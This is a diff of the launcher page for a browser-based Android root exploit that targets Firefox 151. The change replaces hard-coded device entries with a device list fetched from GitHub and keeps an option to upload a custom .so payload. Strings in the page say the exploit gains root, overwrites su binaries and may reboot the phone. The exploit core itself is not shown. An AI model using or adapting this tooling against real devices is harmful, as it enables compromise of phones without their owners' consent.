@@ -1,29 +1,16 @@
 <!doctype html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>神秘网页Root</title>
-<link rel="stylesheet" href="../../Assets/modal.css">
-<style>
-    body{
-        background-image: url("https://t.alcy.cc/ycy");
-        background-size: cover;
-        background-repeat: no-repeat;
-        background-position: center;
-        background-attachment: fixed;
-    }
-</style>
+<title>Rootme</title>
+<link rel="stylesheet" href="../Assets/modal.css">
 <body>
-    <a href="https://blog.wssllhdg.dpdns.org">我的博客</a><br/>
-    <hr/>
-    <a href="https://archive.mozilla.org/pub/fenix/releases/151.0/android/fenix-151.0-android-arm64-v8a/fenix-151.0.multi.android-arm64-v8a.apk">Firefox浏览器下载链接(务必使用该浏览器)</a>
-    <p>开源地址:https://github.com/hexo141/Rootme/</p>
-    <p>开源地址:https://github.com/NebuSec/CyberMeowfia/</p>
+    <a href="https://archive.mozilla.org/pub/fenix/releases/151.0/android/fenix-151.0-android-arm64-v8a/fenix-151.0.multi.android-arm64-v8a.apk">下载 Firefox 151</a>
+    <p>开源地址:<a href="https://github.com/ImSordayne/Rootme/" target="_blank">https://github.com/ImSordayne/Rootme/</a></p>
+    <p>开源地址:<a href="https://github.com/NebuSec/CyberMeowfia/" target="_blank">https://github.com/NebuSec/CyberMeowfia/</a></p>
     <p>本网页仅针对大众性设备，若您的设备为Google Pixel的部分支持设备,<a href="https://rootme.nebusec.ai/">点我跳转</a></p>
-    <p>快速提取偏移量工具，<a href="../../Sources/auto_extract_offsets.py" download="auto_extract_offsets.py">点我下载</a></p>
-    <p>so文件引用地址:https://www.coolapk.com/feed/72734616?s=ZTBjZWRjY2EzMWY4MTFnNmE1MjU3ODN6a1640</p>
     <p>请等待几十秒，若是长时间不出日志，则您未使用firefox浏览器，或您的设备不支持</p>
 </body>
-<script src="../../Assets/modal.js"></script>
+<script src="../Assets/modal.js"></script>
 <script>
 customAlert("请使用firefox 151.0版本访问本网页，若您未下载，请访问:https://archive.mozilla.org/pub/fenix/releases/151.0/android/fenix-151.0-android-arm64-v8a/fenix-151.0.multi.android-arm64-v8a.apk")
 const MAX_ATTEMPTS = 3;
@@ -34,11 +21,7 @@ const PREVIEW_MODE = String(queryParams.get("preview") || "").trim().toLowerCase
 const PREVIEW_DEVICE_ID = String(queryParams.get("deviceId") || "").trim() || "google/pixel10/pixel10:17/CP2A.260605.012/15430684:user/release-keys";
 
 const DEVICES = [
-  { id: "lenovo", name: "Lenovo Tab TB330FU", path: "Lenovo Tab TB330FU/", hasVersions: false },
-  { id: "oneplus", name: "OnePlus PLQ110 (Ace 5 Pro / K3)", path: "OnePlus PLQ110/", hasVersions: false },
-  { id: "redmi", name: "Redmi K80Ultra", path: "Redmi K80Ultra/", hasVersions: true },
-  { id: "generic", name: "其他/通用设备 (arm.so)", path: "", hasVersions: false },
-  { id: "custom", name: "自定义 so 文件（本地上传）", path: "", hasVersions: false },
+  { id: "custom", name: "自定义 so 文件（本地上传）", soPath: "" },
 ];
 let selectedDevice = null;
 let selectedVersion = "";
@@ -70,6 +53,25 @@ let exploitFrame = null;
 let exploitRunToken = "";
 let exploitAttemptToken = "";
 const frames = [];
+
+function getDevices() {
+  return fetch("https://raw.githubusercontent.com/ImSordayne/Rootme/devices/devices.json")
+    .then(response => {
+                    if (!response.ok) {
+                      console.error("Failed to fetch devices.json: " + response.status + " " + response.statusText);
+                    }
+                    return response.json();
+                })
+    .then(data => {
+      for (const device of data.devices) {
+        DEVICES.push(device);
+      }
+    })
+    .catch(error => {
+      console.error(error);
+      DEVICES.push({ id: "error", name: "无法加载设备列表，请检查网络连接", path: "" });
+    });
+}
 
 function childUrl(n) {
   const dir = location.pathname.replace(/[^/]*$/, "");
@@ -339,7 +341,7 @@ addEventListener("message", async (event) => {
     const ok = await customConfirm(
       "设备 ID: " + deviceId + "\n\n" +
       (isSupported ?
-        "检测到您的设备受支持。预期结果：您将获取 root，壁纸会作为可见成功信号发生变化。注意：如果设备已被 root，漏洞利用会覆盖 /bin/su 和 /data/local/tmp/su。该过程可能会重启手机。继续吗？(成功率应 >95%，但漏洞利用可能需要 4-10 分钟)" :
+        "检测到您的设备受支持。预期结果：您将获取 root。注意：如果设备已被 root，漏洞利用会覆盖 /bin/su 和 /data/local/tmp/su。该过程可能会重启手机。继续吗？(成功率应 >95%，但漏洞利用可能需要 4-10 分钟)" :
         "我们尚未为您的设备构建完整的 root 链。预期结果：手机可能会崩溃并重启，但不会损坏设备。继续吗？(漏洞利用可能需要几分钟)" )
     );
     if (!ok) {
@@ -440,24 +442,23 @@ if (!agreed) {
   return;
 }
 
+await getDevices();
+
 const deviceId = await customVersionSelect("请选择您的设备型号：", DEVICES.map(function(d) { return { label: d.name, value: d.id }; }));
 selectedDevice = DEVICES.find(function(d) { return d.id === deviceId; }) || DEVICES[3];
 
-if (selectedDevice.hasVersions) {
-  const versionChoice = await customVersionSelect("请选择 HyperOS 系统版本：\nOS3.0.302.0 - OS3.0.303.0 (os3.so)\nOS2.0.210.0 - OS2.0.220.0 (os2.so)", [
-    { label: "os3.so", value: "os3" },
-    { label: "os2.so", value: "os2" },
-  ]);
-  selectedVersion = versionChoice;
-}
-
-if (selectedDevice.id === "custom") {
+if (selectedDevice.id === "error") {
+  history.back();
+  return;
+} else if (selectedDevice.id === "custom") {
   const soFile = await customFileSelect("请选择您的 .so 文件：", ".so");
   if (!soFile) {
     history.back();
     return;
   }
   customSoUrl = URL.createObjectURL(soFile);
+} else {
+  customSoUrl = selectedDevice.sopath || "";
 }
 
 startAttempt();
